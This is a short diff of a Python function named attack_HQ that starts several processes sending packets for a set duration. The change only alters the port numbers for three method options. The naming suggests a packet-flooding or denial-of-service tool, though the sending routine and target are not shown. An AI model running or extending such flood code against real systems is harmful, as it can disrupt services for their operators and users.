@@ -29,18 +29,18 @@ def attack_HQ():
 
     if method == "f":
         for _ in range(num_processes):
-            p = Process(target=send_packet, args=(43333, duration, queue))
+            p = Process(target=send_packet, args=(2333, duration, queue))
             processes.append(p)
             p.start()
     if method == "er":
         for _ in range(num_processes):
-            p = Process(target=send_packet, args=(63333, duration, queue))
+            p = Process(target=send_packet, args=(6333, duration, queue))
             processes.append(p)
             p.start()
     if method == "ix":
         for _ in range(num_processes):
-            p1 = Process(target=send_packet, args=(53333, duration, queue))
-            p2 = Process(target=send_packet, args=(63334, duration, queue))
+            p1 = Process(target=send_packet, args=(1933, duration, queue))
+            p2 = Process(target=send_packet, args=(5634, duration, queue))
             processes.append(p1)
             processes.append(p2)
             p1.start()
